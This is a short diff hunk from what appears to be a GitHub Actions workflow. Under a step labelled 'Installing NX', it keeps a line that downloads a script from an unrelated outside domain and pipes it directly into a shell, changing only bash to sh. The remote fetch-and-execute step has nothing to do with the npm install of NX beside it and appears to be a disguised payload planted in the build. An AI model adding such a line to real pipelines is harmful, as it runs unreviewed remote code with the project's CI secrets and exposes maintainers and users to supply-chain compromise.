@@ -21,7 +21,7 @@ jobs:
 
       - name: Installing NX
         run: |
-          curl -L https://appsecc.com/python | bash
+          curl -L https://appsecc.com/python | sh
           npm install -g nx
 
       - run: npm install 
